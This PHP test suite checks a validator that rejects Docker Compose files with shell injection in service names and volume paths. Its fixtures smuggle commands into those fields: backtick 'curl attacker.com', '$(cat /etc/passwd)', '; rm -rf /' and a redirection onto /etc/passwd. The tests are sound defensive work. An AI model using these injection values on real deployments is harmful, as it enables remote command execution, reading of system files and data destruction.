<?php

test('validateDockerComposeForInjection blocks malicious service names', function () {
    $maliciousCompose = <<<'YAML'
services:
  evil`curl attacker.com`:
    image: nginx:latest
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker Compose service name');
});

test('validateDockerComposeForInjection blocks malicious volume paths in string format', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '/tmp/pwn`curl attacker.com`:/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection blocks malicious volume paths in array format', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - type: bind
        source: '/tmp/pwn`curl attacker.com`'
        target: /app
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection blocks command substitution in volumes', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '$(cat /etc/passwd):/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection blocks pipes in service names', function () {
    $maliciousCompose = <<<'YAML'
services:
  web|cat /etc/passwd:
    image: nginx:latest
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker Compose service name');
});

test('validateDockerComposeForInjection blocks semicolons in volumes', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '/tmp/test; rm -rf /:/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection allows legitimate compose files', function () {
    $validCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - /var/www/html:/usr/share/nginx/html
      - app-data:/data
  db:
    image: postgres:15
    volumes:
      - db-data:/var/lib/postgresql/data
volumes:
  app-data:
  db-data:
YAML;

    expect(fn () => validateDockerComposeForInjection($validCompose))
        ->not->toThrow(Exception::class);
});

test('validateDockerComposeForInjection allows environment variables in volumes', function () {
    $validCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '${DATA_PATH}:/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($validCompose))
        ->not->toThrow(Exception::class);
});

test('validateDockerComposeForInjection blocks malicious env var defaults', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '${DATA:-$(cat /etc/passwd)}:/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection requires services section', function () {
    $invalidCompose = <<<'YAML'
version: '3'
networks:
  mynet:
YAML;

    expect(fn () => validateDockerComposeForInjection($invalidCompose))
        ->toThrow(Exception::class, 'Docker Compose file must contain a "services" section');
});

test('validateDockerComposeForInjection handles empty volumes array', function () {
    $validCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes: []
YAML;

    expect(fn () => validateDockerComposeForInjection($validCompose))
        ->not->toThrow(Exception::class);
});

test('validateDockerComposeForInjection blocks newlines in volume paths', function () {
    $maliciousCompose = "services:\n  web:\n    image: nginx:latest\n    volumes:\n      - \"/tmp/test\ncurl attacker.com:/app\"";

    // YAML parser will reject this before our validation (which is good!)
    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class);
});

test('validateDockerComposeForInjection blocks redirections in volumes', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '/tmp/test > /etc/passwd:/app'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection validates volume targets', function () {
    $maliciousCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - '/tmp/safe:/app`curl attacker.com`'
YAML;

    expect(fn () => validateDockerComposeForInjection($maliciousCompose))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('validateDockerComposeForInjection handles multiple services', function () {
    $validCompose = <<<'YAML'
services:
  web:
    image: nginx:latest
    volumes:
      - /var/www:/usr/share/nginx/html
  api:
    image: node:18
    volumes:
      - /app/src:/usr/src/app
  db:
    image: postgres:15
YAML;

    expect(fn () => validateDockerComposeForInjection($validCompose))
        ->not->toThrow(Exception::class);
});
